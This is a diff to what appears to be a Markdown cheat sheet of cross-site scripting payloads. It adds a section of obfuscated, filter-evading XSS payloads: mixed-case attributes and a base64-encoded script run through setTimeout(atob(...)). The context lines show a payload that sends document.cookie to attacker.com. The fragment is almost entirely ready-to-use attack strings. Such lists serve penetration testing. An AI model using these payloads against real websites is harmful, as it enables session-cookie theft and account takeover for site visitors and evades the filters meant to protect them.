@@ -172,6 +172,13 @@ host+/_ignition/scripts/--%3E%3Csvg%20onload=alert('XSS')%3E
 
 [Ref](https://x.com/momika233/status/1723264646940082330?s=20)
 
+### A payload with some obfuscation & filter evasion tricks
+```
+<img%20hrEF="x"%20sRC="data:x,"%20oNLy=1%20oNErrOR=prompt1>
+
+<img/src/onerror=setTimeout(atob(/YWxlcnQoMTMzNyk/.source))>
+```
+
 ## Send Cookies to remote server
 ```js
 "><img src=x onerror=this.src=https://attacker.com/?+document.cookie;>
